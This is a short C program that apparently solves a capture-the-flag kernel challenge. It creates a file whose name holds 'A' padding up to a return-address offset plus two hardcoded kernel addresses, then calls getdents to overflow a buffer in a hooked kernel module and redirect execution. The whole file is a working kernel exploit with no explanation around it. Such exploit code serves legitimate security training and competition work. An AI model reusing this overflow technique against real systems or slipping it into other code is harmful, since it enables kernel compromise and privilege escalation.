#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define RIP_OFFSET 102

// cleanup_module @ ffffffffc02df36e
// sys_exit @ ffffffff9a63a390

int main(void) {
	FILE *file;
	char filename[1024];
	char buf[256];

	strncpy(filename, "ecsc_flag_", sizeof(filename) - 1);
	for(int i = 0; i < RIP_OFFSET; i++) filename[strlen(filename)] = 'A';

	strncat(filename, "\x6e\xf3\x2d\xc0\xff\xff\xff\xff", sizeof(filename) - 1);
	strncat(filename, "\x90\xa3\x63\x9a\xff\xff\xff\xff", sizeof(filename) - 1);
	
	file = fopen(filename, "w");
	fclose(file);

	int dirfd = open(".", O_RDONLY);
	syscall(SYS_getdents, dirfd, buf, sizeof(buf));

	return 0;
}